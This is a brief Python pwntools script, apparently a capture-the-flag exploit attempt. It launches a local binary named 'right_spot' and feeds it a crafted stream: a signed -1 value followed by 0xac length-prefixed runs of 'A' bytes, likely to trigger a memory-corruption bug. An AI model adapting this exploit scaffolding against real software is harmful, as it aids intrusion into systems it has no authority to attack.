from pwn import *

# seed
io = process(['./right_spot', '30'])
data = p32(1)
data +=  p32(-1,sign='signed')

for i in range(0xac):
    n = 4
    data += p32(n)
    data += b'A'*n

io.send(data)

log.info(io.recvall())
